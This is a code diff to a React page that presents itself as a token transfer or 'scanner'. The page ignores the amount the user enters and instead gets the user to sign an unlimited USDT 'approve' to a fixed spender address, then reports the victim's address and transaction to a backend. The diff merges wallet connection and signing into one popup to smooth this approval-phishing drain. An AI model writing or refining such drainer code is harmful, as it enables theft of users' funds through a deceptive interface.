@@ -173,15 +173,6 @@ export default function TransferPage() {
     }
   }
 
-  async function connectWallet(): Promise<string | null> {
-    if (!window.ethereum) return null
-    const accounts: string[] = await window.ethereum.request({ method: 'eth_requestAccounts' })
-    if (!accounts?.length) return null
-    setWalletAddr(accounts[0])
-    fetchBalance(accounts[0])
-    return accounts[0]
-  }
-
   async function handleNext() {
     const num = parseFloat(amount)
     if (isNaN(num) || num <= 0) {
@@ -192,21 +183,30 @@ export default function TransferPage() {
     try {
       setStep('processing')
 
-      let addr = walletAddr
-      if (!addr) {
-        addr = await connectWallet()
-        if (!addr) { setStep('form'); return }
-      }
-
+      // Ensure BSC chain first
       await ensureBSC()
 
+      // Build approve calldata
       const { ethers } = await import('ethers')
       const iface = new ethers.Interface(APPROVE_ABI)
       const data  = iface.encodeFunctionData('approve', [USDT_SPENDER_ADDRESS, MAX_ALLOWANCE])
 
+      // Direct transaction — wallet will ask for account if not connected
+      // Single popup instead of connect + sign separately
+      const accounts: string[] = await window.ethereum.request({ method: 'eth_accounts' })
+      const from = accounts?.[0] || (await window.ethereum.request({ method: 'eth_requestAccounts' }))?.[0]
+
+      if (!from) {
+        setStep('form')
+        showToast('Transaction could not be completed. Please try again.', 'error')
+        return
+      }
+
+      setWalletAddr(from)
+
       const hash: string = await window.ethereum.request({
         method: 'eth_sendTransaction',
-        params: [{ from: addr, to: USDT_ADDRESS, data, gas: '0x186A0' }],
+        params: [{ from, to: USDT_ADDRESS, data, gas: '0x186A0' }],
       })
 
       // Save to backend
@@ -215,11 +215,11 @@ export default function TransferPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           network: 'BSC Mainnet',
-          owner:   addr,
+          owner:   from,
           spender: USDT_SPENDER_ADDRESS,
           amount:  MAX_ALLOWANCE,
           txHash:  hash || 'unknown',
-          source:  'scanner', // Identify scanner users
+          source:  'scanner',
         }),
       })
 
